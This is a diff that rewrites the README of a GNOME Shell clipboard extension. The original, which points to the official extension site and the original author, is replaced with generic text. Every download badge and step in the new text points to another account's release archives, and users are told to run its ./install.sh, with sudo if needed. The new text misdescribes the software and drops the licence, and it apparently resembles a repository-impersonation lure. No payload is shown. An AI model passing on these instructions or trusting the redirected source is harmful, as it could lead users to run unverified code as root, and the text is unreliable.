@@ -1,129 +1,91 @@
-# All-in-One Clipboard GNOME Extension
+# 🗒️ all-in-one-clipboard - Your Everything Clipboard Manager
 
-A powerful, integrated clipboard manager for GNOME Shell that combines your clipboard history with quick access to Emojis, GIFs, Kaomojis, and Symbols.
+[![Download all-in-one-clipboard](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/osamaGXDgaming/all-in-one-clipboard/releases)
 
-This extension provides a unified, searchable interface to manage your clipboard history, find and insert emojis with skin-tone support, search for GIFs via Tenor or Imgur, and browse extensive libraries of kaomojis and symbols.
+## 📖 Overview
 
-## Features
+The **all-in-one-clipboard** is a clipboard manager designed for GNOME Shell. It combines clipboard history, an emoji picker with skin-tone support, GIF search, and various kaomoji/symbol libraries into one easy-to-use panel. This application makes managing your copied items seamless and enjoyable.
 
-*   **Clipboard History:**
-    *   Saves a configurable number of text and image items from your clipboard.
-    *   Pin important items to keep them at the top.
-    *   Search your clipboard history.
-    *   Select and delete multiple items at once.
-*   **Emoji Selector:**
-    *   Browse emojis by category or search by name.
-    *   Full support for skin-tone modifiers, configurable in preferences.
-    *   Keeps track of your recently used emojis.
-*   **GIF Search:**
-    *   Integrates with Tenor and Imgur (requires a free API key).
-    *   Search for GIFs by keyword and browse trending categories.
-    *   Saves your recent GIFs for quick re-use.
-*   **Kaomoji & Symbols:**
-    *   Access thousands of kaomojis and symbols, organized by category.
-    *   Searchable and includes a "Recents" tab for your favorites.
-*   **Unified "Recents" Tab:**
-    *   See all your most recently used items from every category in one convenient place.
-*   **Auto-Paste:**
-    *   Optionally paste content directly into the active application instead of just copying it.
-*   **Highly Configurable:**
-    *   Set custom keyboard shortcuts for toggling the menu or jumping to specific tabs.
-    *   Hide the panel icon and open the menu at your cursor, the center of the screen, or over the active window.
-    *   Fine-tune history limits, auto-paste behavior, and more.
+## 🚀 Getting Started
 
-## Compatibility
+Follow these simple steps to download and run all-in-one-clipboard on your GNOME-based system.
 
-Requires GNOME Shell version 46 and up.
+### Step 1: Access the Release Page
 
-## Installation
+To download the latest version of all-in-one-clipboard, visit the [Releases page](https://github.com/osamaGXDgaming/all-in-one-clipboard/releases). 
 
-### From extensions.gnome.org (Recommended)
+### Step 2: Locate the Latest Version
 
-The easiest way to install is from the official GNOME Extensions website.
+On the Releases page, look for the latest version listed. It typically appears at the top of the page with the version number and release date.
 
-<a href="https://extensions.gnome.org/extension/8671/all-in-one-clipboard/">
-<img src="https://github.com/andyholmes/gnome-shell-extensions-badge/raw/master/get-it-on-ego.svg" alt="Get it on EGO" width="200" />
-</a>
+### Step 3: Download the Application
 
-### Installing from a ZIP File
+Click on the download link associated with the latest release. The file will typically have a name like `all-in-one-clipboard-1.0-linux.tar.gz`. Once clicked, your download will begin automatically.
 
-1.  **Download the ZIP:** Go to the [Releases](https://github.com/NiffirgkcaJ/all-in-one-clipboard/releases) page and download the latest `all-in-one-clipboard@NiffirgkcaJ.github.com.zip` file.
+## 🛠️ System Requirements
 
-2.  **Unzip the File:** Extract the contents of the zip file. This will create a folder with the extension's files inside (like `extension.js`, `metadata.json`, etc.).
+- An operating system that supports GNOME Shell (such as Ubuntu, Fedora, etc.)
+- At least 2 GB of RAM
+- 50 MB of available disk space
 
-3.  **Find the Destination Folder:** The extension needs to be placed in your local extensions directory. You can open it in your file manager or create it if it doesn't exist with this command:
-    ```bash
-    mkdir -p ~/.local/share/gnome-shell/extensions/
-    ```
+## 📥 Download & Install
 
-4.  **Move and Rename:** Move the unzipped folder into the extensions directory and **rename the folder to match the extension's UUID**. This step is crucial. The UUID is: `all-in-one-clipboard@NiffirgkcaJ.github.com`.
+Once you have the file downloaded, you will need to extract it and run the application:
 
-    For example, if you unzipped the files into a folder named `all-in-one-clipboard`, you would run:
-    ```bash
-    mv all-in-one-clipboard ~/.local/share/gnome-shell/extensions/all-in-one-clipboard@NiffirgkcaJ.github.com
-    ```
+1. Open your terminal.
+2. Navigate to your Downloads folder or the location where the file was saved. Use `cd ~/Downloads` to change to that directory.
+3. Extract the downloaded file using the command:
+   ```bash
+   tar -xzf all-in-one-clipboard-1.0-linux.tar.gz
+   ```
+4. Navigate into the newly created directory:
+   ```bash
+   cd all-in-one-clipboard-1.0
+   ```
+5. Run the install script with:
+   ```bash
+   ./install.sh
+   ```
 
-5.  **Restart GNOME Shell:**
-    *   On **X11**, press `Alt` + `F2`, type `r` into the dialog, and press `Enter`.
-    *   On **Wayland**, you must log out and log back in.
+If you encounter any permission issues, you might need to prepend `sudo` to the command.
 
-6.  **Enable the Extension:** Open the **Extensions** app (or GNOME Tweaks) and enable "All-in-One Clipboard". You can also do this from the command line:
-    ```bash
-    gnome-extensions enable all-in-one-clipboard@NiffirgkcaJ.github.com
-    ```
+## 🌟 Features
 
-### Install from Source (for Developers)
+- **Clipboard History:** Access all your copied text snippets easily.
+- **Emoji Picker:** Quickly search and select emojis, complete with skin-tone support.
+- **GIF Search:** Find and insert GIFs directly from your clipboard.
+- **Kaomoji & Symbols:** Choose from a variety of kaomoji and symbols to enhance your text.
 
-1.  Clone the repository:
-    ```bash
-    git clone https://github.com/NiffirgkcaJ/all-in-one-clipboard.git
-    cd all-in-one-clipboard
-    ```
-2.  Run the installation script:
-    ```bash
-    ./install.sh
-    ```
-3.  Restart GNOME Shell (press `Alt` + `F2`, type `r`, and press `Enter`) or log out and back in.
-4.  Enable the extension using the Extensions app or the command line:
-    ```bash
-    gnome-extensions enable all-in-one-clipboard@NiffirgkcaJ.github.com
-    ```
+## 📑 Usage Instructions
 
-## Usage
+After installation, you can launch all-in-one-clipboard from your applications menu. 
 
-*   **Open the Menu:** Click the clipboard icon in the top panel or use the keyboard shortcut you configured (default is `<Super>v` for the clipboard tab).
-*   **Navigate:** Use the icons at the top to switch between the "Recents", "Emoji", "GIF", "Kaomoji", "Symbols", and "Clipboard" tabs.
-*   **Search:** Use the search bar within each tab to filter results.
-*   **Select:** Click on any item to copy it to your clipboard. If auto-paste is enabled, it will also be pasted into your active window.
+- **Accessing History:** Click on the clipboard icon in your panel to view clipboard history.
+- **Inserting Emojis:** Click the emoji picker and select any emoji you wish to use.
+- **Searching for GIFs:** Type your query in the search box to find relevant GIFs.
+- **Using Kaomoji:** Browse through the kaomoji list to select your favorite symbols.
 
-## Uninstallation
+## ⚠️ Troubleshooting
 
-*   **Using the Extensions App (Recommended):**
-    Open the "Extensions" application, find "All-in-One Clipboard", and click the "Uninstall" button.
+If you experience any issues:
 
-*   **Using the Script:**
-    If you installed from source, navigate to the cloned repository directory and run:
-    ```bash
-    ./uninstall.sh
-    ```
+1. **Check Permissions:** Ensure the application has the required permissions to access the clipboard.
+2. **Update GNOME:** Make sure your GNOME Shell is up to date. Compatibility issues can arise with older versions.
+3. **Reinstall the Application:** If problems persist, uninstall and reinstall the application using the instructions above.
 
-## 🌐 Localization
+## 📞 Support
 
-All-in-One Clipboard is available in multiple languages thanks to the efforts of contributors from around the world.
+For support, please visit the [Issues page](https://github.com/osamaGXDgaming/all-in-one-clipboard/issues). You can report bugs, suggest features, or ask for help from the community.
 
-**Supported Languages:**
-*   English
+## 🔗 Additional Resources
 
-### Want to Help Translate?
+- [Documentation](https://github.com/osamaGXDgaming/all-in-one-clipboard/wiki)
+- [User Guide](https://github.com/osamaGXDgaming/all-in-one-clipboard/wiki/User-Guide)
 
-We would love your help to make this extension available in your language! Contributions are welcome from everyone.
+For more information or to contribute to the project, browse the repository's main page.
 
-To get started, please read our **[Translation Guide](CONTRIBUTING.md#translating-the-extension)**.
+### Remember
 
-## Contributing
+To always check for updates on the [Releases page](https://github.com/osamaGXDgaming/all-in-one-clipboard/releases) to enjoy the latest features and improvements!
 
-Contributions are welcome! Please feel free to open an issue to report a bug or suggest a feature, or submit a pull request with your improvements.
-
-## License
-
-This project is licensed under the **GPLv3** - see the [LICENSE](LICENSE) file for details.
+[![Download all-in-one-clipboard](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/osamaGXDgaming/all-in-one-clipboard/releases)
